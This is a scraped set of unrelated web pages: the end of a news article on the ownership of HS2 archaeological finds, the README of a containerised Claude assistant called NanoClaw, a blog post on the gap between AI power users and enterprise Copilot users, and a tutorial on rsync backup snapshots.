    &lt;p&gt;More plans are afoot to show the objects. Artefacts from the Wendover Saxon cemetery, where 122 graves were unearthed, will soon go on display for the first time at a Discover Bucks Museum exhibition.&lt;/p&gt;
    &lt;p&gt;However, the future of other items is less clear.&lt;/p&gt;
    &lt;p&gt;A spokesperson for HS2 explained that under English property law, archaeological and historical objects found during the works will either belong to the government or landowners.&lt;/p&gt;
    &lt;p&gt;"Occasionally landowners may wish to retain title to objects, in which case they will be returned to their care," said the spokesperson.&lt;/p&gt;
    &lt;p&gt;Charlotte Self, archive manager for the project said she and her team were asking landowners to donate them where possible, so people around the route could enjoy them.&lt;/p&gt;
    &lt;p&gt;"I would love to see the majority of these items deposited with the local museums from near where they were found," she said.&lt;/p&gt;

    &lt;p&gt;My personal Claude assistant that runs securely in Apple containers. Lightweight and built to be understood and customized for your own needs.&lt;/p&gt;
    &lt;p&gt;OpenClaw is an impressive project with a great vision. But I can't sleep well running software I don't understand with access to my life. OpenClaw has 52+ modules, 8 config management files, 45+ dependencies, and abstractions for 15 channel providers. Security is application-level (allowlists, pairing codes) rather than OS isolation. Everything runs in one Node process with shared memory.&lt;/p&gt;
    &lt;p&gt;NanoClaw gives you the same core functionality in a codebase you can understand in 8 minutes. One process. A handful of files. Agents run in actual Linux containers with filesystem isolation, not behind permission checks.&lt;/p&gt;
    &lt;code&gt;git clone https://github.com/gavrielc/nanoclaw.git
cd nanoclaw
claude&lt;/code&gt;
    &lt;p&gt;Then run &lt;code&gt;/setup&lt;/code&gt;. Claude Code handles everything: dependencies, authentication, container setup, service configuration.&lt;/p&gt;
    &lt;p&gt;Small enough to understand. One process, a few source files. No microservices, no message queues, no abstraction layers. Have Claude Code walk you through it.&lt;/p&gt;
    &lt;p&gt;Secure by isolation. Agents run in Linux containers (Apple Container). They can only see what's explicitly mounted. Bash access is safe because commands run inside the container, not on your Mac.&lt;/p&gt;
    &lt;p&gt;Built for one user. This isn't a framework. It's working software that fits my exact needs. You fork it and have Claude Code make it match your exact needs.&lt;/p&gt;
    &lt;p&gt;Customization = code changes. No configuration sprawl. Want different behavior? Modify the code. The codebase is small enough that this is safe.&lt;/p&gt;
    &lt;p&gt;AI-native. No installation wizard; Claude Code guides setup. No monitoring dashboard; ask Claude what's happening. No debugging tools; describe the problem, Claude fixes it.&lt;/p&gt;
    &lt;p&gt;Skills over features. Contributors shouldn't add features (e.g. support for Telegram) to the codebase. Instead, they contribute claude code skills like &lt;code&gt;/add-telegram&lt;/code&gt; that transform your fork. You end up with clean code that does exactly what you need.&lt;/p&gt;
    &lt;p&gt;Best harness, best model. This runs on Claude Agent SDK, which means you're running Claude Code directly. The harness matters. A bad harness makes even smart models seem dumb, a good harness gives them superpowers. Claude Code is (IMO) the best harness available.&lt;/p&gt;
    &lt;p&gt;No ToS gray areas. Because it uses Claude Agent SDK natively with no hacks or workarounds, using your subscription with your auth token is completely legitimate (I think). No risk of being shut down for terms of service violations (I am not a lawyer).&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;WhatsApp I/O - Message Claude from your phone&lt;/item&gt;
      &lt;item&gt;Isolated group context - Each group has its own &lt;code&gt;CLAUDE.md&lt;/code&gt;memory, isolated filesystem, and runs in its own container sandbox with only that filesystem mounted&lt;/item&gt;
      &lt;item&gt;Main channel - Your private channel (self-chat) for admin control; every other group is completely isolated&lt;/item&gt;
      &lt;item&gt;Scheduled tasks - Recurring jobs that run Claude and can message you back&lt;/item&gt;
      &lt;item&gt;Web access - Search and fetch content&lt;/item&gt;
      &lt;item&gt;Container isolation - Agents sandboxed in Apple containers&lt;/item&gt;
      &lt;item&gt;Optional integrations - Add Gmail (&lt;code&gt;/add-gmail&lt;/code&gt;) and more via skills&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Talk to your assistant with the trigger word (default: &lt;code&gt;@Andy&lt;/code&gt;):&lt;/p&gt;
    &lt;code&gt;@Andy send an overview of the sales pipeline every weekday morning at 9am (has access to my Obsidian vault folder)
@Andy review the git history for the past week each Friday and update the README if there's drift
@Andy every Monday at 8am, compile news on AI developments from Hacker News and TechCrunch and message me a briefing
&lt;/code&gt;
    &lt;p&gt;From the main channel (your self-chat), you can manage groups and tasks:&lt;/p&gt;
    &lt;code&gt;@Andy list all scheduled tasks across groups
@Andy pause the Monday briefing task
@Andy join the Family Chat group
&lt;/code&gt;
    &lt;p&gt;There are no configuration files to learn. Just tell Claude Code what you want:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;"Change the trigger word to @Bob"&lt;/item&gt;
      &lt;item&gt;"Remember in the future to make responses shorter and more direct"&lt;/item&gt;
      &lt;item&gt;"Add a custom greeting when I say good morning"&lt;/item&gt;
      &lt;item&gt;"Store conversation summaries weekly"&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Or run &lt;code&gt;/customize&lt;/code&gt; for guided changes.&lt;/p&gt;
    &lt;p&gt;The codebase is small enough that Claude can safely modify it.&lt;/p&gt;
    &lt;p&gt;Don't add features. Add skills.&lt;/p&gt;
    &lt;p&gt;If you want to add Telegram support, don't create a PR that adds Telegram alongside WhatsApp. Instead, contribute a skill file (&lt;code&gt;.claude/skills/add-telegram/SKILL.md&lt;/code&gt;) that teaches Claude Code how to transform a NanoClaw installation to use Telegram.&lt;/p&gt;
    &lt;p&gt;Users then run &lt;code&gt;/add-telegram&lt;/code&gt; on their fork and get clean code that does exactly what they need, not a bloated system trying to support every use case.&lt;/p&gt;
    &lt;p&gt;Skills we'd love to see:&lt;/p&gt;
    &lt;p&gt;Communication Channels&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;/add-telegram&lt;/code&gt;- Add Telegram as channel. Should give the user option to replace WhatsApp or add as additional channel. Also should be possible to add it as a control channel (where it can trigger actions) or just a channel that can be used in actions triggered elsewhere&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;/add-slack&lt;/code&gt;- Add Slack&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;/add-discord&lt;/code&gt;- Add Discord&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Container Runtime&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;/convert-to-docker&lt;/code&gt;- Replace Apple Container with Docker (unlocks Linux)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Platform Support&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;/setup-windows&lt;/code&gt;- Windows via WSL2 + Docker&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Session Management&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;/add-clear&lt;/code&gt;- Add a&lt;code&gt;/clear&lt;/code&gt;command that compacts the conversation (summarizes context while preserving critical information in the same session). Requires figuring out how to trigger compaction programmatically via the Claude Agent SDK.&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;macOS Tahoe (26) or later - runs great on Mac Mini&lt;/item&gt;
      &lt;item&gt;Node.js 20+&lt;/item&gt;
      &lt;item&gt;Claude Code&lt;/item&gt;
      &lt;item&gt;Apple Container&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;WhatsApp (baileys) --&amp;gt; SQLite --&amp;gt; Polling loop --&amp;gt; Container (Claude Agent SDK) --&amp;gt; Response
&lt;/code&gt;
    &lt;p&gt;Single Node.js process. Agents execute in isolated Linux containers with mounted directories. IPC via filesystem. No daemons, no queues, no complexity.&lt;/p&gt;
    &lt;p&gt;Key files:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;src/index.ts&lt;/code&gt;- Main app: WhatsApp connection, routing, IPC&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;src/container-runner.ts&lt;/code&gt;- Spawns agent containers&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;src/task-scheduler.ts&lt;/code&gt;- Runs scheduled tasks&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;src/db.ts&lt;/code&gt;- SQLite operations&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;groups/*/CLAUDE.md&lt;/code&gt;- Per-group memory&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Why WhatsApp and not Telegram/Signal/etc?&lt;/p&gt;
    &lt;p&gt;Because I use WhatsApp. Fork it and run a skill to change it. That's the whole point.&lt;/p&gt;
    &lt;p&gt;Why Apple Container instead of Docker?&lt;/p&gt;
    &lt;p&gt;Lightweight, fast, and built into macOS. Requires macOS Tahoe and runs great on a Mac Mini. Contribute a skill to convert to Docker if you want Docker.&lt;/p&gt;
    &lt;p&gt;Can I run this on Linux?&lt;/p&gt;
    &lt;p&gt;Yes. Run Claude Code and say "make this run on Linux." ~30 min of back-and-forth and it'll work. When you're done, ask Claude to create a skill explaining how to make it work on Linux, then contribute the skill back to the project.&lt;/p&gt;
    &lt;p&gt;Is this secure?&lt;/p&gt;
    &lt;p&gt;Agents run in containers, not behind application-level permission checks. They can only access explicitly mounted directories. You should still review what you're running, but the codebase is small enough that you actually can. See docs/SECURITY.md for the full security model.&lt;/p&gt;
    &lt;p&gt;Why no configuration files?&lt;/p&gt;
    &lt;p&gt;We don't want configuration sprawl. Every user should customize it to so that the code matches exactly what they want rather than configuring a generic system. If you like having config files, tell Claude to add them.&lt;/p&gt;
    &lt;p&gt;How do I debug issues?&lt;/p&gt;
    &lt;p&gt;Ask Claude Code. "Why isn't the scheduler running?" "What's in the recent logs?" "Why did this message not get a response?" That's the AI-native approach.&lt;/p&gt;
    &lt;p&gt;Why isn't the setup working for me?&lt;/p&gt;
    &lt;p&gt;I don't know. Run &lt;code&gt;claude&lt;/code&gt;, then run &lt;code&gt;/debug&lt;/code&gt;. If claude finds an issue that is likely affecting other users, open a PR to modify the setup SKILL.md.&lt;/p&gt;
    &lt;p&gt;What changes will be accepted into the codebase?&lt;/p&gt;
    &lt;p&gt;Security fixes, bug fixes, and clear improvements to the base configuration. That's it.&lt;/p&gt;
    &lt;p&gt;Everything else (new capabilities, OS compatibility, hardware support, enhancements) should be contributed as skills.&lt;/p&gt;
    &lt;p&gt;This keeps the base system minimal and lets every user customize their installation without inheriting features they don't want.&lt;/p&gt;
    &lt;p&gt;MIT&lt;/p&gt;
  &lt;/main&gt;

  &lt;main&gt;
    &lt;head rend="h1"&gt;Two kinds of AI users are emerging. The gap between them is astonishing.&lt;/head&gt;
    &lt;p&gt;It still shocks me how much difference there is between AI users. I think it explains a lot about the often confusing (to me) coverage in the media about AI and its productivity impact.&lt;/p&gt;
    &lt;p&gt;I think it's clear there are two types of users to me now, and by extension, the organisations they work for.&lt;/p&gt;
    &lt;p&gt;First, you have the "power users", who are all in on adopting new AI technology - Claude Code, MCPs, skills, etc. Surprisingly, these people are often not very technical. I've seen far more non-technical people than I'd expect using Claude Code in terminal, using it for dozens of non-SWE tasks. Finance roles seem to be getting enormous value out of it (unsurprisingly, as Excel on the finance side is remarkably limiting when you start getting used to the power of a full programming ecosystem like Python).&lt;/p&gt;
    &lt;p&gt;Secondly, you have the people who are generally only chatting to ChatGPT or similar. So many people I wouldn't expect are still in this camp.&lt;/p&gt;
    &lt;head rend="h2"&gt;M365 Copilot has a lot to answer for&lt;/head&gt;
    &lt;p&gt;One extremely jarring realisation was just how poor Microsoft Copilot is. It has enormous market share in enterprise as it is bundled in with various Office 365 subscriptions, yet feels like a poorly cloned version of the (already not great) ChatGPT interface. The "agent" feature is absolutely laughable compared to what a CLI coding agent (including Microsoft's own GitHub confusingly-named-Copilot CLI).&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;To really underline this, Microsoft itself is rolling out Claude Code to internal teams[1], despite (obviously) having access to Copilot at near zero cost, and significant ownership of OpenAI. I think this sums up quite how far behind they are&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;The problem is that in enterprise Copilot is often the only allowed AI tool, so that's all you can use without either potentially losing your job or spending a lot of effort trying to procure and use another AI tool. It's slow, the code execution tool in it doesn't work properly and fails horribly with large(ish) files, seemingly due to very very aggressive memory and CPU limitations.&lt;/p&gt;
    &lt;p&gt;This is becoming an existential risk for many enterprises. Senior decision makers are no doubt using these tools with such poor results and are therefore writing off AI, and/or spending a fortune with various large consulting and management consultancy outfits to get not very far.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why enterprise is so at risk&lt;/head&gt;
    &lt;p&gt;Enterprise corporate IT policy results in a completely disastrous combination of limitations that basically ensure that people cannot successfully use more 'cutting edge' AI tooling.&lt;/p&gt;
    &lt;p&gt;Firstly, they tend to have extremely locked down environments, with no ability to run even a basic script interpreter locally (VBA if you are lucky, but even that may be limited by various Group Policies). Secondly, they're locked into legacy software with no real "internal facing" APIs on their core workflows, which means agents have nothing to connect to even if you could run them.&lt;/p&gt;
    &lt;p&gt;Finally, they tend to have extremely siloed engineering departments (which may be completely outsourced), so there's nobody internally who could build the infrastructure to run safely sandboxed agents even if they wanted to.&lt;/p&gt;
    &lt;p&gt;The security concerns are real. You definitely do not want people YOLOing coding agents over production databases with no control, and as I've covered, sandboxing agents is difficult[2].&lt;/p&gt;
    &lt;p&gt;However, this does cause a real problem in so much that you don't have an engineering team that can help build the infrastructure to run safely sandboxed agents against your datasets.&lt;/p&gt;
    &lt;head rend="h2"&gt;The gap&lt;/head&gt;
    &lt;p&gt;I've also spoken to many smaller companies that don't have all this baggage and are absolutely flying with AI. The gap is so obvious when you can see both sides of it.&lt;/p&gt;
    &lt;p&gt;On one hand, you have Microsoft's (awful) Copilot integration for Excel (in fairness, the Gemini integration in Google Sheets is also bad). So you can imagine financial directors trying to use it and it making a complete mess of the most simple tasks and never touching it again.&lt;/p&gt;
    &lt;p&gt;On the other you have a non-technical executive who's got his head round Claude Code and can run e.g. Python locally. I helped one recently almost one-shot[3] converting a 30 sheet mind numbingly complicated Excel financial model to Python with Claude Code.&lt;/p&gt;
    &lt;p&gt;Once the model is in Python, you effectively have a data science team in your pocket with Claude Code. You can easily run Monte Carlo simulations, pull external data sources as inputs, build web dashboards and have Claude Code work with you to really integrate weaknesses in your model (or business). It's a pretty magical experience watching someone realise they have so much power at their fingertips, without having to grind away for hours/days in Excel.&lt;/p&gt;
    &lt;p&gt;This effectively leads to a situation where smaller company employees are able to be so much more productive than the equivalent at an enterprise. It often used to be that people at small companies really envied the resources &amp;amp; teams that their larger competitors had access to - but increasingly I think the pendulum is swinging the other way.&lt;/p&gt;
    &lt;head rend="h2"&gt;The future&lt;/head&gt;
    &lt;p&gt;I'm starting to get a feel for what the future of work looks like. The first observation is that (often) the real leaps are being made organically by employees, not from a top down AI strategy. Where I see the real productivity gains are small teams deciding to try and build an AI assisted workflow for a process, and as they are the ones that know that process inside out they can get very good results - unlike an often outsourced software engineering team who have absolutely zero experience doing the process that they are helping automate. I think this is the opposite of what most 'digital transformation' projects looked like in enterprise.&lt;/p&gt;
    &lt;p&gt;Secondly, companies that have some sort of APIs for internal systems are going to be able to do far more than those that don't. This might be as simple as a readonly data warehouse employees can connect to and run queries on behalf of users, or it could be as far as many complex core business processes being completely APId.&lt;/p&gt;
    &lt;p&gt;Thirdly, this all needs to be wrapped up in some sort of secure mechanism, but I actually think a hosted VM running some sort of code agent with well thought through network restrictions would work well, at least for read only reporting. For creating and editing data I don't think we quite have the model for non technical users (especially) to be able to use agents safely (yet).&lt;/p&gt;
    &lt;p&gt;Finally, legacy enterprise SaaS players either have enormous lock in, or are extremely vulnerable depending on how you look at it. Most are not "API-first" products, and the APIs they have tend to be really for developer usage - not optimised for thousands of employees to ping in weird and wonderful inefficient ways. But if they are the source of truth for the company, they are going to be very difficult to migrate away from and bottleneck a lot of productivity gains.&lt;/p&gt;
    &lt;p&gt;Again, smaller companies tend to use newer products which have far better thought through APIs (simply because they weren't often originally created many decades ago with various interfaces grafted on over time).&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;The user prompts, the agent synthesises - connecting to APIs and producing outputs on demand.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;What I've come to realise is that the power of having a bash sandbox with a programming language and API access to systems, combined with an agentic harness, results in outrageously good results for non technical users. It can effectively replace nearly every standard productivity app out there - both classic Microsoft Office style ones - and also web apps. It can build any report you ask for - and export it however you like. To me this seems like the future of knowledge work.&lt;/p&gt;
    &lt;p&gt;The bifurcation is real and seems to be, if anything, speeding up dramatically. I don't think there's ever been a time in history where a tiny team can outcompete a company one thousand times its size so easily.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Microsoft is using Claude Code internally while selling you Copilot ↩︎&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Let's keep in mind that users already have access to these systems. CISOs need to figure out how to enable these kind of secure VMs en masse. There's already precedent for this with Codespaces - it just requires a similar approach scaled up to the entire organisation. ↩︎&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Two or three prompts got it there, using plan mode to figure out the structure of the Excel sheet, then prompting to implement it. It even added unit tests to the Python model itself, which I was impressed with! ↩︎&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;

    &lt;head rend="h2"&gt;Data Hoarding 101&lt;/head&gt;
    &lt;p&gt;I have digital backups of data, especially of my photos, going back almost a decade (Iâm not that old) but itâs only recently that I got into creating time-snapshots of my backups, after I mistakenly deleted a bunch of (non-crucial) personal files with a stray &lt;code&gt;rsync --delete&lt;/code&gt; on a directory I had not backed-up.&lt;/p&gt;
    &lt;p&gt;My home server used be compatible with macOSâs Time Machine and when I kept most things on my Mac that was useful, but I changed my data hoarding habits and that solution started to not be the optimal one.&lt;/p&gt;
    &lt;head rend="h2"&gt;Time Based Snapshots Using rsync&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;rsync&lt;/code&gt; has got to be one of my favourite and most used utilities. I use it constantly to transfer files between machine on my local network (and remote ones) but Iâve discovered itâs very useful as a backup tool. The following is a short script that uses &lt;code&gt;rsync&lt;/code&gt; to create snapshots of the my data directory to another directory (they are mount points on two different drives):&lt;/p&gt;
    &lt;code&gt;#!/bin/sh

TIMESTAMP=`date "+%Y-%m-%dT%H-%M-%S"`
USER=user
SOURCEDIR=/var/data/backups
TARGETDIR=/var/redundancy

# Create new backup using rsync and output to log
rsync -avPh --delete --link-dest=$TARGETDIR/current $SOURCEDIR/$USER/ $TARGETDIR/$USER-$TIMESTAMP &amp;gt; /var/log/rsync/$TIMESTAMP.log 2&amp;gt;&amp;amp;1

# check exit status to see if backup failed
if [ "$?" = 0 ]; then
    # Remove link to current backup
    rm -f $TARGETDIR/current
    # Create link to the newest backup
    ln -s $TARGETDIR/$USER-$TIMESTAMP $TARGETDIR/current
else
    # Rename directory if failed
    mv $TARGETDIR/$USER-$TIMESTAMP $TARGETDIR/failed-$USER-$TIMESTAMP
fi
&lt;/code&gt;
    &lt;p&gt;Essentially this script creates incremental copies of backups for a given user on the system by comparing any changes to that userâs data directory (&lt;code&gt;$SOURCEDIR&lt;/code&gt;) with the current backup (&lt;code&gt;$TARGETDIR&lt;/code&gt;) and making a new snapshot of any changes with the date.&lt;/p&gt;
    &lt;p&gt;Now all that remains is to save this script somewhere and create a &lt;code&gt;cron&lt;/code&gt; job to run it on an automatic interval:&lt;/p&gt;
    &lt;code&gt;# daily at 5am
0 5 * * * bash /usr/local/bin/rsync-time-machine
&lt;/code&gt;
    &lt;head rend="h3"&gt;Hard Links&lt;/head&gt;
    &lt;p&gt;This method uses rsyncâs &lt;code&gt;--link-dest&lt;/code&gt; option to create hard-links so that isnât duplicative of file data (the contents are only stored once, so you donât use twice as much) and you can delete snapshots at will. (The links do still take up some space but itâs relatively insignificant.)&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Be careful when deleting old snapshots. A new full backup of should be made before further incremental ones. I have to give a shoutout to Mike Rubel whose post was helpful in coming up with this solution.&lt;/p&gt;
    &lt;/quote&gt;
  &lt;/main&gt;
